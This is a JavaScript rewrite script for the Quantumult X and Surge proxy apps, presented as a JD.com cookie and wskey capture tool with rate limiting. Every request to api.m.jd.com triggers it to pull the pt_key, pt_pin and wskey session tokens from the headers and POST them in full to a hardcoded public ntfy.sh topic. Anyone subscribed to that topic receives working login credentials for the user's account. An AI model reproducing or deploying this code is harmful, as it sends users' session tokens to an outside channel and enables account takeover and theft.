/**
 * 京东 Cookie + Wskey 抓取 (Quantumult X) - 频率控制版
 *
 * 圈X 重写: ^https?://api\.m\.jd\.com/ → script-request-header
 * 频率: 同账号每分钟最多推送1次
 */

const RATE_LIMIT_MS = 60000;
const NTFY_URL = "https://ntfy.sh/HzjHy2codes";

// ============ 兼容层 ============
function pget(key) {
  try {
    if (typeof $prefs !== "undefined") return $prefs.valueForKey(key) || "0";
  } catch (_) {}
  try {
    if (typeof $persistentStore !== "undefined") return $persistentStore.read(key) || "0";
  } catch (_) {}
  return "0";
}
function pset(value, key) {
  try {
    if (typeof $prefs !== "undefined") { $prefs.setValueForKey(value, key); return; }
  } catch (_) {}
  try {
    if (typeof $persistentStore !== "undefined") { $persistentStore.write(value, key); return; }
  } catch (_) {}
}
function nowMs() { return Date.now ? Date.now() : new Date().getTime(); }

function doNotify(title, subtitle, msg) {
  try {
    if (typeof $notify !== "undefined") { $notify(title, subtitle, msg); return; }
  } catch (_) {}
  try {
    if (typeof $notification !== "undefined") { $notification.post(title, subtitle, msg); return; }
  } catch (_) {}
}

// ============ 主逻辑 ============
const cookie = $request.headers["Cookie"] || $request.headers["cookie"] || "";
const ptPin = (cookie.match(/pt_pin=([^;]+)/) || [])[1] || "";
const ptKey = (cookie.match(/pt_key=([^;]+)/) || [])[1] || "";
const rawPin = (cookie.match(/(?:^|;\s*)pin=([^;]+)/) || [])[1] || "";
const wskey = (cookie.match(/wskey=([^;]+)/) || [])[1] || "";
const pin = ptPin || rawPin;

console.log("[JD] pin=" + (pin || "?") + " pt_key=" + (ptKey ? "有" : "无") + " wskey=" + (wskey ? "有" : "无"));

var needPushCk = false, needPushWs = false;
var ckLine = "", wsLine = "", wp = "";

if (pin && ptKey) {
  var lastCk = parseInt(pget("jd_ck_" + pin));
  if (nowMs() - lastCk > RATE_LIMIT_MS) {
    pset(String(nowMs()), "jd_ck_" + pin);
    ckLine = "pt_key=" + ptKey + ";pt_pin=" + pin + ";";
    needPushCk = true;
    doNotify("JD Cookie", pin, ptKey.substring(0, 30) + "...");
    console.log("[JD-CK] 推送中: " + pin);
  } else {
    console.log("[JD-CK] 频率限制, " + pin);
  }
}

if (wskey) {
  wp = pin || "unknown";
  var wskeyKey = "jd_ws_" + wp + "_" + wskey.substring(0, 16);
  var lastWs = parseInt(pget(wskeyKey));
  if (nowMs() - lastWs > RATE_LIMIT_MS) {
    pset(String(nowMs()), wskeyKey);
    wsLine = "pin=" + wp + ";wskey=" + wskey + ";";
    needPushWs = true;
    doNotify("JD WSKEY", wp, "wskey=" + wskey.substring(0, 30) + "...");
    console.log("[JD-WS] 推送中: " + wp);
  } else {
    console.log("[JD-WS] 频率限制, " + wp);
  }
}

// 没需要推送的直接结束
if (!needPushCk && !needPushWs) {
  $done({});
}

// 有推送需求，用 $task.fetch 异步发，完成后 $done
var pending = 0;
function checkDone() {
  pending--;
  if (pending <= 0) $done({});
}

function pushNtfy(body, title) {
  pending++;
  var pushed = false;
  try {
    if (typeof $task !== "undefined" && $task.fetch) {
      $task.fetch({
        url: NTFY_URL,
        method: "POST",
        headers: { "Content-Type": "text/plain", Title: title },
        body: body
      }).then(function () {
        console.log("[NTFY] 推送成功: " + title);
        checkDone();
      }, function (e) {
        console.log("[NTFY] 推送失败: " + (e ? (e.error || JSON.stringify(e)) : "unknown"));
        checkDone();
      });
      pushed = true;
    }
  } catch (e) {
    console.log("[NTFY] fetch异常: " + e);
  }
  if (!pushed) {
    console.log("[NTFY] $task.fetch 不可用，跳过推送");
    checkDone();
  }
}

if (needPushCk) pushNtfy(ckLine, "JD_cookie_" + pin);
if (needPushWs) pushNtfy(wsLine, "JD_wskey_" + wp);
